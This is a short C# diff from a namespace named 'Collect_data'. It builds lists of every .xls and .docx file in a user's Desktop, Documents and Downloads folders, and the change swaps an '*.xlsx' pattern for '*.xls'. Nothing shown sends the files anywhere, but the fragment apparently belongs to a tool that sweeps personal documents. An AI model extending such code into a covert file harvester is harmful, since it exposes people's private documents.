@@ -19,7 +19,7 @@ namespace Collect_data
         public static string[] files_xls_desktop = Directory.GetFiles(desktop, "*.xls", SearchOption.AllDirectories);
         public static string[] files_xls_documets = Directory.GetFiles(documents, "*.xls", SearchOption.AllDirectories);
         public static string[] files_xls_downloads = Directory.GetFiles(downloads, "*.xls", SearchOption.AllDirectories);
-        public static string[] files_xls_C = Directory.GetFiles(C, "*.xlsx");
+        public static string[] files_xls_C = Directory.GetFiles(C, "*.xls");
 
         public static string[] files_docx_desktop = Directory.GetFiles(desktop, "*.docx", SearchOption.AllDirectories);
         public static string[] files_docx_documets = Directory.GetFiles(documents, "*.docx", SearchOption.AllDirectories);
